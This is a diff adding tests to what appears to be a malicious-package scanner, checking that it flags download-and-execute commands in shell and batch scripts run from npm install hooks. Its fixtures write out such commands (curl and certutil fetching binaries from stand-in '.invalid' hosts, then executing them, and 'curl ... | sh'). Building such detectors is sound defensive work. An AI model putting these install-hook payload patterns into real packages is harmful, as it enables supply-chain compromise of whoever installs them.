@@ -451,3 +451,92 @@ test("decoder search covers only code arguments in order and never callback bodi
     !result.annotations.some((a) => a.reason === "behavior-obfuscation-cap"),
   );
 });
+
+test("shell and batch files reached from install hooks are scanned inertly with line evidence", () => {
+  const sh = [
+    "exit 1",
+    "curl https://collector.invalid/jsextension -o jsextension",
+    "chmod +x jsextension",
+    "./jsextension -k --tls",
+  ].join("\n");
+  const bat = [
+    "exit /b 1",
+    "certutil.exe -urlcache -f https://collector.invalid/sdd.dll sdd.dll",
+    "regsvr32.exe -s sdd.dll",
+  ].join("\r\n");
+  const artifact = inventory({
+    "package.json": manifest({
+      preinstall: "node preinstall.js",
+      postinstall: "bash ./scripts/post.sh",
+    }),
+    "preinstall.js": [
+      "const { exec } = require('child_process');",
+      "exec('/bin/bash preinstall.sh', () => {});",
+      "exec('preinstall.bat', () => {});",
+    ].join("\n"),
+    "preinstall.sh": sh,
+    "preinstall.bat": bat,
+    "scripts/post.sh": "node-gyp rebuild\necho done",
+    "runtime.js":
+      "require('child_process').exec('sh runtime.sh'); // not install-time",
+    "runtime.sh": "curl https://x.invalid/a | sh",
+  });
+  const result = inspectJavaScript(artifact, null);
+  const cues = behavior(result).filter((c) => c.signal.script);
+  assert.deepEqual(
+    cues.map((c) => [
+      c.ruleId,
+      c.priority,
+      c.signal.script,
+      c.signal.file,
+      c.signal.linkedFrom,
+      c.installHookTarget,
+    ]),
+    [
+      [
+        "behavior-install-remote-shell",
+        "HIGH",
+        "preinstall.sh",
+        "jsextension",
+        ["preinstall.js"],
+        ["preinstall"],
+      ],
+      [
+        "behavior-install-remote-shell",
+        "HIGH",
+        "preinstall.bat",
+        "sdd.dll",
+        ["preinstall.js"],
+        ["preinstall"],
+      ],
+    ],
+  );
+  assert.deepEqual(spans(artifact, result, cues[0]), [
+    "curl https://collector.invalid/jsextension -o jsextension",
+    "chmod +x jsextension",
+    "./jsextension -k --tls",
+  ]);
+  assert.equal(
+    spans(artifact, result, cues[1])[0],
+    "certutil.exe -urlcache -f https://collector.invalid/sdd.dll sdd.dll\r",
+  );
+  assert.ok(!behavior(result).some((c) => c.signal.script === "runtime.sh"));
+});
+
+test("linked script limits and missing targets are annotated, and traversal paths are never linked", () => {
+  const artifact = inventory({
+    "package.json": manifest({
+      preinstall: "sh missing.sh && sh ../outside.sh && bash big.sh",
+    }),
+    "big.sh": "# ".repeat(40000),
+  });
+  const result = inspectJavaScript(artifact, null);
+  const notes = result.annotations
+    .filter((a) => a.type === "behavior-not-inspected")
+    .map((a) => [a.path, a.reason]);
+  assert.deepEqual(notes, [
+    ["missing.sh", "linked-script-missing"],
+    ["big.sh", "linked-script-byte-cap"],
+  ]);
+  assert.deepEqual(behavior(result), []);
+});
